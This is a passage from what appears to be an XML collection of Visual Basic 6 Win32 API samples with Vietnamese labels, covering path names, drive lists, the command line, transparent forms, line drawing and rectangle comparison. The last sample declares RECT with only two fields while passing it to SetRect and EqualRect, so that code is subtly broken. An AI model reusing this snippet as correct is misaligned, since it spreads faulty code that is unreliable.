        Case Else
            Me.Print "Unrecognized"
    End Select
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090721100723</MaVD>
    <NoiDung>Private Declare Function GetFullPathName Lib "kernel32" Alias "GetFullPathNameA" (ByVal lpFileName As String, ByVal nBufferLength As Long, ByVal lpBuffer As String, ByVal lpFilePart As String) As Long
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim Buffer As String, Ret As Long
    'create a buffer
    Buffer = Space(255)
    'copy the current directory to the buffer and append 'myfile.ext'
    Ret = GetFullPathName("myfile.ext", 255, Buffer, "")
    'remove the unnecessary chr$(0)'s
    Buffer = Left(Buffer, Ret)
    'show the result
    MsgBox Buffer
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090921100909</MaVD>
    <NoiDung>Const SHGFI_ICONLOCATION = &amp;H1000
Const MB_ICONASTERISK = &amp;H40&amp;
Const MB_ICONEXCLAMATION = &amp;H30&amp;
Const MAX_PATH = 260
Private Type MSGBOXPARAMS
    cbSize As Long
    hwndOwner As Long
    hInstance As Long
    lpszText As String
    lpszCaption As String
    dwStyle As Long
    lpszIcon As String
    dwContextHelpId As Long
    lpfnMsgBoxCallback As Long
    dwLanguageId As Long
End Type
Private Declare Function GetLogicalDrives Lib "kernel32" () As Long
Private Declare Function MessageBoxEx Lib "user32" Alias "MessageBoxExA" (ByVal hwnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal uType As Long, ByVal wLanguageId As Long) As Long
Private Declare Function MessageBoxIndirect Lib "user32" Alias "MessageBoxIndirectA" (lpMsgBoxParams As MSGBOXPARAMS) As Long
Private Declare Sub PostQuitMessage Lib "user32" (ByVal nExitCode As Long)
Private Declare Function GetCommandLine Lib "kernel32" Alias "GetCommandLineA" () As Long
Private Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Sub Form_Paint()
    'KPD-Team 1999,2001
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim MBP As MSGBOXPARAMS, LDs As Long, Cnt As Long, sDrives As String
    'get the available drives
    LDs = GetLogicalDrives
    sDrives = "Available drives:"
    For Cnt = 0 To 25
        If (LDs And 2 ^ Cnt) &lt;&gt; 0 Then
            sDrives = sDrives + " " + Chr$(65 + Cnt)
        End If
    Next Cnt
    'Show the commandline
    MessageBoxEx Me.hwnd, "The command line: " + GetCommLine, "Command Line ...", MB_ICONEXCLAMATION, 0
    'Set the structure size
    MBP.cbSize = Len(MBP)
    'Set the icon style
    MBP.dwStyle = MB_ICONASTERISK
    'set the owner wndow
    MBP.hwndOwner = Me.hwnd
    'set teh text
    MBP.lpszText = sDrives
    'set the caption
    MBP.lpszCaption = "Available drives"
    'Show the messagebox
    MessageBoxIndirect MBP
    'end our application
    PostQuitMessage 0
End Sub
Private Function GetCommLine() As String
    Dim RetStr As Long, SLen As Long
    Dim Buffer As String
    'Get a pointer to a string, which contains the command line
    RetStr = GetCommandLine
    'Get the length of that string
    SLen = lstrlen(RetStr)
    If SLen &gt; 0 Then
        'Create a buffer
        GetCommLine = Space$(SLen)
        'Copy to the buffer
        CopyMemory ByVal GetCommLine, ByVal RetStr, SLen
    End If
End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091021101055</MaVD>
    <NoiDung>Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim strSave As String
    'Set the graphic mode to persistent
    Me.AutoRedraw = True
    'Create a buffer to store all the drives
    strSave = String(255, Chr$(0))
    'Get all the drives
    ret&amp; = GetLogicalDriveStrings(255, strSave)
    'Extract the drives from the buffer and print them on the form
    For keer = 1 To 100
        If Left$(strSave, InStr(1, strSave, Chr$(0))) = Chr$(0) Then Exit For
        Me.Print Left$(strSave, InStr(1, strSave, Chr$(0)) - 1)
        strSave = Right$(strSave, Len(strSave) - InStr(1, strSave, Chr$(0)))
    Next keer
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092024032058</MaVD>
    <NoiDung>Bài: Xem mật khẩu sau các dấu ***</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090624040617</MaVD>
    <NoiDung>Xem bài: Thêm background của TreeView là màu hay hình</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091824041804</MaVD>
    <NoiDung>Làm cho form trong suốt. Trích Mỗi tuần một "Tuyệt chiêu cho VB60"
http://5nam.ttvnol.com/f_147/193561/trang-14.ttvn

Public Ch As String
Private Type RECT
Left As Long
Top As Long
Right As Long
Bottom As Long
End Type

Private Type POINTAPI
x As Long
y As Long
End Type

Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Private Declare Function GetClientRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Private Declare Function ScreenToClient Lib "user32" (ByVal hwnd As Long, lpPoint As POINTAPI) As Long

Private Declare Function CombineRgn Lib "gdi32" (ByVal hDestRgn As Long, ByVal hSrcRgn1 As Long, ByVal hSrcRgn2 As Long, ByVal nCombineMode As Long) As Long
Private Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function SetWindowRgn Lib "user32" (ByVal hwnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Const RGN_AND = 1
Const RGN_COPY = 5
Const RGN_DIFF = 4
Const RGN_OR = 2
Const RGN_XOR = 3

Private Sub MakeFormTransparent(ByVal frm As Form)


Dim rctClient As RECT, rctFrame As RECT, rctCTRL As RECT
Dim hClient As Long, hFrame As Long
Dim ctrl As Control, ctrlCount As Long
Dim lpTL As POINTAPI, lpBR As POINTAPI

GetWindowRect frm.hwnd, rctFrame
GetClientRect frm.hwnd, rctClient

lpTL.x = rctFrame.Left
lpTL.y = rctFrame.Top
lpBR.x = rctFrame.Right
lpBR.y = rctFrame.Bottom
ScreenToClient frm.hwnd, lpTL
ScreenToClient frm.hwnd, lpBR
rctFrame.Left = lpTL.x
rctFrame.Top = lpTL.y
rctFrame.Right = lpBR.x
rctFrame.Bottom = lpBR.y
rctClient.Left = Abs(rctFrame.Left)
rctClient.Top = Abs(rctFrame.Top)
rctClient.Right = rctClient.Right + Abs(rctFrame.Left)
rctClient.Bottom = rctClient.Bottom + Abs(rctFrame.Top)
rctFrame.Right = rctFrame.Right + Abs(rctFrame.Left)
rctFrame.Bottom = rctFrame.Bottom + Abs(rctFrame.Top)
rctFrame.Top = 0
rctFrame.Left = 0

hClient = CreateRectRgn(rctClient.Left, rctClient.Top, rctClient.Right, rctClient.Bottom)
hFrame = CreateRectRgn(rctFrame.Left, rctFrame.Top, rctFrame.Right, rctFrame.Bottom)

CombineRgn hFrame, hClient, hFrame, RGN_XOR


For ctrlCount = 0 To frm.Controls.Count - 1
Set ctrl = frm.Controls(ctrlCount)
On Error GoTo ForLoop_ErrHand
GetWindowRect ctrl.hwnd, rctCTRL

lpTL.x = rctCTRL.Left
lpTL.y = rctCTRL.Top
lpBR.x = rctCTRL.Right
lpBR.y = rctCTRL.Bottom
ScreenToClient frm.hwnd, lpTL
ScreenToClient frm.hwnd, lpBR
rctCTRL.Left = lpTL.x + 4
rctCTRL.Top = lpTL.y + 30
rctCTRL.Right = lpBR.x + 4
rctCTRL.Bottom = lpBR.y + 30

hClient = CreateRectRgn(rctCTRL.Left, rctCTRL.Top, rctCTRL.Right, rctCTRL.Bottom)
CombineRgn hFrame, hClient, hFrame, RGN_XOR

ForLoop_ErrHand:
Next

SetWindowRgn frm.hwnd, hFrame, True

End Sub


Private Sub Form_Load()
MakeFormTransparent Me
End Sub


</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093324043303</MaVD>
    <NoiDung>Erick37
http://www.experts-exchange.com/Programming/Languages/Visual_Basic/Q_21309060.html

Form có command1 và Picture1

Option Explicit

Private Type POINTAPI
    X As Long
    Y As Long
End Type

Private Declare Function MapWindowPoints Lib "user32" (ByVal hwndFrom As Long, ByVal hwndTo As Long, lppt As Any, ByVal cPoints As Long) As Long

Private Sub DrawLine(pb As PictureBox, ByVal x1 As Long, ByVal x2 As Long, ByVal y1 As Long, ByVal y2 As Long)
    
    Dim pts(1) As POINTAPI
    Dim lRet As Long
    Dim ctl As Control
    
    'first draw the line through the main picturebox
    pb.Line (x1, y1)-(x2, y2)
    
    'now loop the remaining pictureboxes and draw
    'lines through them with the mapped coordinates
    
    For Each ctl In Controls
        If (TypeOf ctl Is PictureBox) And Not (ctl Is pb) Then
    
            'assign and convert to Pixels (assuming each picturebox is default Twips)
            pts(0).X = x1 / Screen.TwipsPerPixelX
            pts(0).Y = y1 / Screen.TwipsPerPixelY
            pts(1).X = x2 / Screen.TwipsPerPixelX
            pts(1).Y = y2 / Screen.TwipsPerPixelY
            
            'map the points to the other picturebox
            lRet = MapWindowPoints(pb.hWnd, ctl.hWnd, pts(0), 2)
            
            'convert back to Twips
            pts(0).X = pts(0).X * Screen.TwipsPerPixelX
            pts(0).Y = pts(0).Y * Screen.TwipsPerPixelY
            pts(1).X = pts(1).X * Screen.TwipsPerPixelX
            pts(1).Y = pts(1).Y * Screen.TwipsPerPixelY
    
            ctl.Line (pts(0).X, pts(0).Y)-(pts(1).X, pts(1).Y)
            
        End If
            
    Next
End Sub

Private Sub Command1_Click()

    'Example of how to call the sub
    'Picture1 is the main picturebox which contains other pictureboxes

    DrawLine Picture1, 0, 5000, 0, 5000

End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094624044651</MaVD>
    <NoiDung>http://vbonline.8m.com/oldapi/ref/e/equalrect.html

Private Type RECT
    X As Long
    Y As Long
End Type

Private Declare Function EqualRect Lib "user32.dll" (lpRect1 As RECT, lpRect2 As RECT) As Long
Private Declare Function SetRect Lib "user32.dll" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long

Private Sub Command1_Click()
' Demonstrate equal and unequal rectangles
Dim r As RECT, s As RECT  ' rectangles to use
Dim areequal As Long  ' receives whether the rectangles are equal or not
Dim retval As Long  ' return value

' Initialize the two rectangles using the API
retval = SetRect(r, 15, 20, 100, 110)  ' r = (15,20)-(100,110)
retval = SetRect(s, 15, 20, 100, 110)  ' s = (15,20)-(100,110)
areequal = EqualRect(r, s)  ' compare the rectangles
If areequal = 1 Then Debug.Print "Are Equal" Else Debug.Print "Are Not Equal"
' Change the second rectangle
retval = SetRect(s, 30, 45, 200, 250)  ' s = (30,45)-(200,250)
areequal = EqualRect(r, s)  ' compare the rectangles
If areequal = 1 Then Debug.Print "Are Equal" Else Debug.Print "Are Not Equal"
' The first time is Are Equal, the second is Are Not Equal.
End Sub</NoiDung>
  </Vidu>
</NewDataSet>